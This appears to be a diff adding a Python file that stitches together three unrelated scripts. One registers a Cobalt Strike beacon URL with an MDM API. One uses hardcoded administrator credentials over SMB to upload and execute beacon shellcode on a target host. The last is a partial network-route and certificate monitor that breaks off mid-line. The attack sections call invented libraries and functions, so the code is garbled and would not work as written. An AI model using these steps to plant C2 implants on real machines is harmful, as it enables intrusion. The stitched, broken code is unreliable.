@@ -1,0 +1,178 @@
+#Root-Function Base
+#Mark Lindsey/Intelligence Cloouds
+#GNU License Open-Source, Net-Neutral
+
+import requests
+import json
+
+# Define the URL of the MDM API endpoint
+mdm_url = "https://api.example.com/mdm"
+
+# Define the Cobalt Strike beacon URL
+beacon_url = "https://beacon.example.com"
+
+# Define the MDM API credentials
+api_key = "your_api_key_here"
+api_secret = "your_api_secret_here"
+
+# Define the headers for the MDM API request
+headers = {
+    "Authorization": "Bearer {} {}".format(api_key, api_secret),
+    "Content-Type": "application/json"
+}
+
+# Define the payload for the MDM API request
+payload = {
+    "beacon_url": beacon_url
+}
+
+# Send the request to the MDM API
+response = requests.post(mdm_url, headers=headers, data=json.dumps(payload))
+
+# Check the response status code
+if response.status_code == 200:
+    print("Beacon URL successfully registered with MDM software")
+else:
+    print("Error registering beacon URL with MDM software")
+
+
+from c2 import *
+
+# Define the target host and port
+target_host = "192.168.0.100"
+target_port = "442"
+
+# Define the beacon configuration settings
+beacon_config = {
+    "port": target_port,
+    "sleep": "5000",
+    "jitter": "50",
+    "maxdns": "15",
+    "watermark": "50",
+    "method": "https-stager",
+    "user": "administrator",
+    "pwd": "password123"
+}
+
+# Generate the Cobalt Strike payload
+payload = payloads.windows.x64.shellcode_to_beacon(stageless=True, arch="x64")
+
+# Connect to the target and install the beacon
+with requests.Session() as session:
+    try:
+        # Connect to the target using SMB
+        smb = SMBConnection(target_host, target_host, None, None, use_ntlm_v2=True)
+        smb.connect(target_host, 445)
+        print("Connected to target")
+
+        # Upload and execute the payload
+        output = smb.putFile("beacon.bin", payload)
+        smb.execute("\\\\{}\\admin$\\beacon.bin".format(target_host))
+        print("Payload uploaded and executed")
+
+        # Start the beacon
+        cs = CobaltStrike(host=target_host, proto="smb", smb=smb)
+        cs.beacon(**beacon_config)
+        print("Beacon started on port {}".format(target_port))
+
+    except Exception as e:
+        print("Error installing beacon: {}".format(str(e)))
+
+
+import os
+import socket
+import ssl
+import subprocess
+import urllib.request
+
+# Define the known good route for the source IP address
+KNOWN_GOOD_ROUTE = ["10.0.0.1", "192.168.0.1", "172.16.0.1"]
+
+# Define the path to the SSL certificate for the domain
+SSL_CERT_PATH = "/path/to/domain.crt"
+
+# Define the Twilio account SID and authentication token
+TWILIO_ACCOUNT_SID = "your_account_sid"
+TWILIO_AUTH_TOKEN = "your_auth_token"
+TWILIO_PHONE_NUMBER = "your_twilio_phone_number"
+YOUR_PHONE_NUMBER = "your_phone_number"
+
+# Define the Pushover API token and user key
+PUSHOVER_API_TOKEN = "your_api_token"
+PUSHOVER_USER_KEY = "your_user_key"
+
+def check_bgp_route(ip_address):
+    """
+    Check if the IP address is part of a valid BGP route.
+    """
+    # Use pybgpstream to query a BGP route registry database
+    # and check if the IP address is part of a valid route
+    # ...
+    return True  # or False if the check fails
+
+def check_route_hops(source_ip):
+    """
+    Check if the route taken by the inbound request is the expected route.
+    """
+    # Use subprocess to perform a traceroute to the source IP address
+    traceroute_output = subprocess.check_output(["traceroute", source_ip])
+
+    # Parse the traceroute output and compare the route taken to the known good route
+    hops = [line.split()[1] for line in traceroute_output.decode().split("\n")[1:-1]]
+    if hops != KNOWN_GOOD_ROUTE:
+        return False
+
+    return True
+
+def check_ssl_cert(domain):
+    """
+    Check if the SSL certificate presented by the inbound request is valid.
+    """
+    # Use urllib.request to retrieve the SSL certificate for the domain
+    cert_file, _ = urllib.request.urlretrieve("https://" + domain + "/")
+
+    # Use cryptography to parse the SSL certificate and check if it is signed by a trusted CA
+    with open(cert_file, "rb") as f:
+        cert = ssl.PEM_cert_to_DER_cert(f.read())
+    # ...
+    return True  # or False if the check fails
+
+def check_ssl_match(domain):
+    """
+    Check if the SSL certificate presented by the inbound request matches the expected certificate.
+    """
+    # Use OpenSSL to retrieve the SSL certificate for the domain
+    p = subprocess.Popen(["openssl", "s_client", "-connect", domain + ":443"], stdout=subprocess.PIPE)
+    output = p.communicate()[0].decode()
+
+    # Parse the SSL certificate from the output and compare it to the expected certificate
+    cert = ssl.get_server_certificate((domain, 443))
+    with open(SSL_CERT_PATH, "r") as f:
+        expected_cert = f.read()
+    if cert != expected_cert:
+        return False
+
+    return True
+
+def check_dns(domain):
+    """
+    Check if the domain is present in the DNS zone.
+    """
+    try:
+        socket.gethostbyname(domain)
+    except socket.gaierror:
+        return False
+
+    return True
+
+# Main loop
+while True:
+    # Wait for incoming traffic
+    # ...
+
+    # Check each inbound request for the specified conditions
+    source_ip = get_source_ip()  # Replace with actual implementation
+    domain = get_domain_from_request()  # Replace with actual implementation
+    if not check_bgp_route(source_ip):
+        send_alert("BGP route not found")
+    if not check
